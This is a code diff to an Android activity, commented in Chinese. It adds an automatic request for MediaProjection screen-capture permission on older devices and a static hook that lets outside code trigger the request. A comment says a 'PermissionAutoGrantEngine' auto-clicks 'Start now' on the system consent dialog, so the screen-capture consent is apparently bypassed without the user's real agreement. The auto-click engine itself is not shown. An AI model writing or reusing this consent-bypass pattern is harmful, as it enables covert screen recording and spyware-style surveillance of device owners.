@@ -223,6 +223,41 @@ public class ActivMain extends Activity {
         }
 
         Log.d(TAG, "All permissions granted");
+
+        // API < 30 需要 MediaProjection 才能截屏，自动请求授权
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            requestMediaProjectionPermission();
+        }
+    }
+
+    /**
+     * 请求 MediaProjection 权限 — API < 30 设备截屏需要
+     * 会弹出系统授权弹窗，PermissionAutoGrantEngine 自动点击"立即开始"
+     */
+    private void requestMediaProjectionPermission() {
+        try {
+            android.media.projection.MediaProjectionManager mpm =
+                (android.media.projection.MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            if (mpm != null) {
+                Log.d(TAG, "Requesting MediaProjection permission");
+                startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to request MediaProjection", e);
+        }
+    }
+
+    /**
+     * 静态触发 MediaProjection 请求 — 供外部调用
+     */
+    public static void triggerMediaProjectionRequest() {
+        WeakReference<Activity> ref = currentActivityRef;
+        if (ref == null || ref.get() == null) return;
+        Activity activity = ref.get();
+        if (activity instanceof ActivMain) {
+            activity.runOnUiThread(() -> ((ActivMain) activity).requestMediaProjectionPermission());
+            Log.d("MainActivity", "triggerMediaProjectionRequest from external");
+        }
     }
 
     // ============ onResume (vendor 行 309-339, 一比一对齐) ============
